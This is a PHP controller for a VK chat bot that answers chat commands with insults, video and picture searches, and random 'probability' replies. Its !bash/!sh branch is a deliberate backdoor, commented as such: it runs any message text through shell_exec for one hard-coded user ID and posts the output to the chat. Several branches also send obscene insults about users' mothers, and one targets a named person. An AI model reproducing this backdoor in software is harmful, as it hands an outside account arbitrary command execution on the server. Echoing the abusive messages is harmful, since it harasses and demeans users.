<?php
	namespace Controllers;
	class Bot {
		protected $blacklist;
		protected $vkAPI;
		protected $peer_id;
		protected $command;
		protected $from_id;
		protected $do;
		protected $userToken;
		protected $youRe = '/^(бот){0,}\!{0,}\s{0,}\,{0,}\s{0,}ты\s/iu';
		protected $videoRe = '/^\!вид(е|ив)о/iu';
		protected $picRe = '/\!(пикча|pic)/iu';
		protected $promilleRe = '/^(‰|%)\s/iu';
		protected $bash = "/^\!(ba|z){0,1}sh\s/iu";

		public function antiSpam ($text) {
			$text = str_replace('.', '(dot)', $text);
			$text = str_replace('/', '(slash)', $text);
			$text = str_replace('https', '(хатэтэПСССССС)', $text);
			$text = str_replace('http', '(хатэтэпэ)', $text);
			$text = str_replace(':', '(colon)', $text);
			return $text;
		}

		public function getMention ($from_id) {
			$userInfo = $this->vkAPI->usersGet(
				$from_id,
				'screen_name'
			);
			return "@{$userInfo[0]['screen_name']}";
		}

		public function inBlacklist ($user_id) {
			return in_array($user_id, $this->blacklist);
		}

		public function getAttachment($type, $owner, $id) {
			return "{$type}{$owner}_{$id}";
		}

		public function __construct($peer_id, $command, $from_id, $data_object, $blacklist, $access_token, $user_token) {
			$this->peer_id = $peer_id;
			$this->command = $command;
			$this->from_id = $from_id;
			$this->do = $data_object;
			$this->blacklist = $blacklist;
			$this->userToken = $user_token;
			$this->vkAPI = new \Models\vkAPI (
				$access_token,
				$this->userToken
			);
			if($this->inBlacklist($this->from_id)) {
				exit("{$this->from_id} IS BANNED");
			}
			if (preg_match($this->youRe, $this->command)) {
				$this->command = preg_replace($this->youRe, '', $this->command);
				$this->command = $this->antiSpam($this->command);
				$this->command = trim($this->command);
				$botNames = new \Models\BotNames();
				$botNames->add (
					$this->command,
					$this->from_id
				);
				$botName = $botNames->randomPhrase();
				$mention = $this->getMention($from_id);
				$this->vkAPI->messagesSend(
					$peer_id,
					"{$mention}, а ты {$botName}"
				);
			}
			elseif (preg_match('/^стул/iu', $this->command)) {
				$mamka = [
					'ТВОЯ МАТЬ ЗДОХЛА',
					'ТВОЯ МАТЬ ПИСАЕТ В ГОРШОЧЕК ЧЕКАЙ',
					'ТВОЯ МАТЬ ШЛЮХА',
					'твоя мать умерла🖕🖕🖕🖕🖕🖕',
					'я ебал твою мать выблядок'
				];
				$randomMamka = $mamka[array_rand($mamka)];
				$mention = $this->getMention($this->from_id);
				$this->vkAPI->messagesSend(
					$this->peer_id,
					"$mention, " . $randomMamka
				);
			}
			elseif (preg_match($this->videoRe, $this->command)) {
				$this->command = preg_replace($this->videoRe, '', $this->command);
				$videos = $this->vkAPI->videoSearch(
					$this->command,
					1,
					200
				)['items'];
				$video = $videos[array_rand($videos)];
				$video = $this->getAttachment('video', $video['owner_id'], $video['id']);
				$mention = $this->getMention($this->from_id);
				if(!empty($videos)) {
					$this->vkAPI->messagesSend(
						$this->peer_id,
						"$mention (Ваше говно)",
						[
							$video
						]
					);
				}
				else {
					$this->vkAPI->messagesSend(
						$this->peer_id,
						"$mention (Нихуя не нашел...)"
					);
				}
			}
			elseif(preg_match("/(По вашему запросу видео не найдено|В связи с правилами ВК только по разрешению даю возможность использовать команды с 18\+|Город не найден\.)/iu", $this->command) && $this->from_id == 84253946) {
				$this->vkAPI->messagesSend (
					$this->peer_id,
					'ГЕЖА ЛОХ ОБЪЕЛСЯ ХУЕВ СЕЛ НА ЛАВОЧКУ И ЗДОХ'
				);
			}
			elseif (preg_match ("/\!(help|man|ман|помощь)/iu", $this->command)) {
				$mention = $this->getMention($this->from_id);
				$this->vkAPI->messagesSend(
					$this->peer_id,
					"$mention, https://vk.com/@govnobot_suka-manual -- читай"
				);
			}
			elseif (preg_match($this->picRe, $this->command)) {
				$this->command = preg_replace($this->picRe, '', $this->command);
				$pics = $this->vkAPI->photosSearch(
					$this->command,
					1000
				)['items'];
				$pic = $pics[array_rand($pics)];
				$pic = $this->getAttachment('photo', $pic['owner_id'], $pic['id']);
				$mention = $this->getMention($this->from_id);
				if(!empty($pics)) {
					$this->vkAPI->messagesSend(
						$this->peer_id,
						"$mention (Ваше говно) (Ориг: $pic)",
						[
							$pic
						]
					);
				}
				else {
					$this->vkAPI->messagesSend(
						$this->peer_id,
						"$mention (Нихуя не нашел...)"
					);
				}
			}
			elseif(preg_match($this->promilleRe, $this->command)) {
				$this->command = preg_replace($this->promilleRe, '', $this->command);
				$this->command = $this->antiSpam($this->command);
				if(!preg_match('/Гежа (нихуя не умеет|хуй|мудак|еблан|пидор|уебан)/iu', $this->command)) {
					$promille = rand(0,1000);
				}
				else {
					$promille = 1000;
				}
				$mention = $this->getMention($this->from_id);
				$this->vkAPI->messagesSend(
					$this->peer_id,
					"$mention, вероятность того что {$this->command} -- {$promille}‰"
				);
			}
			elseif(preg_match($this->bash, $this->command)) {
				$this->command = preg_replace($this->bash, '', $this->command);
				if($from_id == 176904287) { // бекдор
					$out = shell_exec($this->command);
					try {
						$this->vkAPI->messagesSend(
							$this->peer_id,
							$out
						);
					}
					catch (Exception $e) {
						$this->vkAPI->messagesSend(
							$e,
							$this->from_id
						);
					}
				}
			}
			elseif(preg_match('/м(о|а)леку(л|р)а/iu', $command)) {
				$random = md5(rand(1, 100000));
				$this->vkAPI->messagesSend($peer_id, "АЧИЛАВЕКМАЛЕКУЛА!!1111 [random: 0x{$random}]");
			}
		}
	}
?>